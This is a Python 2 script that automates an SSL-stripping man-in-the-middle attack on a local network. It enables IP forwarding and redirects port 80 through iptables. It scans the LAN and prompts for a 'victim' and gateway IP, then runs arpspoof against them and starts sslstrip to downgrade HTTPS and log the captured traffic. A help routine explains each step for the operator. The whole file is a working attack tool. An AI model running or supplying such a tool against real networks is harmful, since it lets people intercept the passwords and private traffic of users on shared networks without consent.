#!/usr/bin/python

####################
# Module:   SSL-Strip
# Author:   S.Schuster
# Date:     2015/11/11
# Version:  1.0
#
# Description: Script for automation redirect from https-Pages
# to http-Pages. With unencrypted Web-Traffic every input can 
# be sniffed.
#
###############################
# Log:
# 2015/11/11    S.S - Initial
# 2015/11/09    S.S - 
################################


import os
import subprocess
import time

class SSLStrip:

	def start(self):
		insertEntries = True
		finishSSLStrip = "n"


		print "### SSL-Strip ### \n\n"
                print "Available interfaces: "
                subprocess.call(["ls", "/sys/class/net"])

                interface = raw_input("Select interface: ")

		# enable ip-forwarding temporary		
		with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
		        ipf.write('1\n')

		# add iptaple-rule for PREROUTING incoming traffic from victim to port 8080 (sslstrip)
		subprocess.call(["iptables",  "-t", "nat",  "-A",  "PREROUTING",  "-p", "tcp",  "--destination-port", "80",  "-j", "REDIRECT",  "--to-port",  "8080"])

		print "\n Scan hosts (LAN) ..."
                subprocess.call(["arp-scan", "--interface="+interface,  "--localnet"])

		print "\n Please enter IP-Address of victim-device for arp-spoofing"
		host = raw_input("IP-Address (Victim): ")

		print "\n Please enter Gateway-IP-Address (casual x.x.x.1)"
		gateway = raw_input("IP-Address (Gateway): ")

		print "Victim %s, Gateway %s" % (host, gateway)

		# arp-spoofing traffic from host<->gateway
		arpspoof = subprocess.Popen(["arpspoof", "-i", interface, "-t", host, gateway], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		# output, errors = arpspoof.communicate()
		# print "Ausgabe arpspoof: %2" % arpspoof.poll()

		# sslstrip
		sslpath = "/root/Desktop/"+time.strftime("%d-%m-%Y_")+"sslstrip.log"
		sslstrip = subprocess.Popen(["sslstrip", "-s", "-p", "-k", "-l", "8080", "-w", sslpath], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

		print "\n SSL-Strip is running! \n You can find logged ssl-traffic in "+sslpath		
		
		while finishSSLStrip != "x":
			finishSSLStrip = raw_input("Terminate SSL-Strip with typing x: ")

		if finishSSLStrip == "x":
			# arpspoof.terminate()
			# sslstrip.terminate()
			# enable ip-forwarding temporary
	                with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
        	                ipf.write('0\n')
			# delete nat-rules for prerouting
			subprocess.call(["iptables", "-t", "nat", "-F"])

			print "SSLStrip finished! Every logged ssl-traffic is stored in "+sslpath
		

			

		



	def help(self):
		print "Tutorial how to use ssl-strip: \n", \
			"\n 1st step: \n", \
			"Select available interface, (default is eth0 or wlan0). Then network of selected interface will be scanned for hosts.", \
                        "\n 2nd step: \n", \
			"When host-scan finished, please enter victim-ip that should be arp-spoofed and gateway-ip for mitm (man in the middle). \n", \
			"After that arp-spoof is running and https-links will rewrited to http-links without encryption."
			
